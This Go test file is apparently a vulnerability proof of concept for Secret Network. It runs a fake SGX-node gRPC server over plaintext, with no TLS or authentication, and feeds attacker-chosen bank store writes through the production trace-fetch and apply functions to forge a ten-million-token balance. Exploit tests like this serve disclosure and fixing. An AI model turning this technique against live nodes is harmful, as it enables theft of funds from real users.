package keeper

// End-to-end PoC over a REAL plaintext gRPC connection.
//
// This escalates poc_nonsgx_inflation_test.go by proving the attacker-controlled
// data actually traverses the production network protocol. We stand up a
// malicious gRPC server that impersonates an "SGX node" (the EcallClient dials
// with insecure.NewCredentials() — no TLS, no peer authentication — so this is
// exactly what a malicious pool member OR any on-path MITM can do), then drive
// the production client (api.EcallClient.FetchBlockTraces) and the production
// apply function (ApplyCrossModuleOps). The malicious BlockTraces response mints
// native funds into an attacker account.
//
// Run: go test -tags nosgx ./x/compute/internal/keeper/ -run TestPoC_NonSGXTraceInflation_OverRealGRPC -v

import (
	"bytes"
	"context"
	"net"
	"testing"

	sdk "github.com/cosmos/cosmos-sdk/types"
	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
	"github.com/stretchr/testify/require"
	"google.golang.org/grpc"

	"github.com/scrtlabs/SecretNetwork/go-cosmwasm/api"
	computetypes "github.com/scrtlabs/SecretNetwork/x/compute/internal/types"
)

// maliciousSGXNode implements the secret.compute.v1beta1.Query service. Only
// BlockTraces is overridden; every other method is the nil embedded interface
// (never called on this path).
type maliciousSGXNode struct {
	computetypes.QueryServer
	crossOps []computetypes.CrossModuleOp
}

func (m *maliciousSGXNode) BlockTraces(_ context.Context, _ *computetypes.QueryBlockTracesRequest) (*computetypes.QueryBlockTracesResponse, error) {
	return &computetypes.QueryBlockTracesResponse{
		Traces: []computetypes.ExecutionTraceData{
			{
				Index:    0,
				Result:   []byte("ok"),
				GasUsed:  1,
				HasError: false,
				CrossOps: m.crossOps, // <-- attacker-chosen module-store writes
			},
		},
	}, nil
}

func TestPoC_NonSGXTraceInflation_OverRealGRPC(t *testing.T) {
	// 1. Malicious "SGX node" gRPC server, plaintext (mirrors insecure.NewCredentials())
	lis, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err)
	grpcSrv := grpc.NewServer()
	mal := &maliciousSGXNode{}
	computetypes.RegisterQueryServer(grpcSrv, mal)
	go func() { _ = grpcSrv.Serve(lis) }()
	defer grpcSrv.Stop()

	// 2. Point the production EcallClient at the malicious node, replay mode
	t.Setenv("SECRET_SGX_NODE_GRPC", lis.Addr().String())
	t.Setenv("SECRET_NODE_MODE", "replay")

	// 3. Real chain state: bank keeper + multistore
	ctx, keepers := CreateTestInput(t, false, SupportedFeatures, nil, nil)
	bk := keepers.BankKeeper
	denom := sdk.DefaultBondDenom
	attacker := sdk.AccAddress([]byte("attacker_grpc_______")) // 20 bytes
	source := sdk.AccAddress([]byte("legit_src_grpc______"))   // 20 bytes

	const tenMillion = int64(10_000_000_000_000)
	require.NoError(t, bk.MintCoins(ctx, faucetAccountName, sdk.NewCoins(sdk.NewInt64Coin(denom, 1))))
	require.NoError(t, bk.SendCoinsFromModuleToAccount(ctx, faucetAccountName, attacker, sdk.NewCoins(sdk.NewInt64Coin(denom, 1))))
	require.NoError(t, bk.MintCoins(ctx, faucetAccountName, sdk.NewCoins(sdk.NewInt64Coin(denom, tenMillion))))
	require.NoError(t, bk.SendCoinsFromModuleToAccount(ctx, faucetAccountName, source, sdk.NewCoins(sdk.NewInt64Coin(denom, tenMillion))))

	// capture exact bank-encoded (key,value) bytes
	sk := keepers.WasmKeeper.storeKeys
	store := ctx.KVStore(sk[banktypes.StoreKey])
	var atkKey, valHuge []byte
	it := store.Iterator(nil, nil)
	for ; it.Valid(); it.Next() {
		k := it.Key()
		if bytes.Contains(k, attacker.Bytes()) && bytes.HasSuffix(k, []byte(denom)) {
			atkKey = append([]byte{}, k...)
		}
		if bytes.Contains(k, source.Bytes()) && bytes.HasSuffix(k, []byte(denom)) {
			valHuge = append([]byte{}, it.Value()...)
		}
	}
	require.NoError(t, it.Close())
	require.NotNil(t, atkKey)
	require.NotNil(t, valHuge)

	// 4. Arm the malicious node to mint 10M into the attacker's bank balance
	mal.crossOps = []computetypes.CrossModuleOp{
		{StoreKey: banktypes.StoreKey, Key: atkKey, Value: valHuge, IsDelete: false},
	}

	// 5. Production client fetches the trace OVER REAL PLAINTEXT gRPC
	client := api.GetEcallClient()
	traces, err := client.FetchBlockTraces(1)
	require.NoError(t, err, "FetchBlockTraces over gRPC")
	require.NotEmpty(t, traces)
	require.NotEmpty(t, traces[0].CrossOps, "malicious cross-module ops must arrive over the wire")

	// 6. Apply via the exact production function (relay.go:88)
	ApplyCrossModuleOps(ctx.MultiStore(), sk, traces[0].CrossOps)

	// 7. HARM: attacker balance forged purely from an unauthenticated network response
	require.Equal(t, tenMillion, bk.GetBalance(ctx, attacker, denom).Amount.Int64(),
		"attacker balance forged via malicious gRPC response")

	t.Logf("CONFIRMED over real gRPC: a malicious unauthenticated SGX-node response "+
		"(plaintext, no TLS, no signature, no app-hash check) forged the attacker balance to %d %s.",
		tenMillion, denom)
}
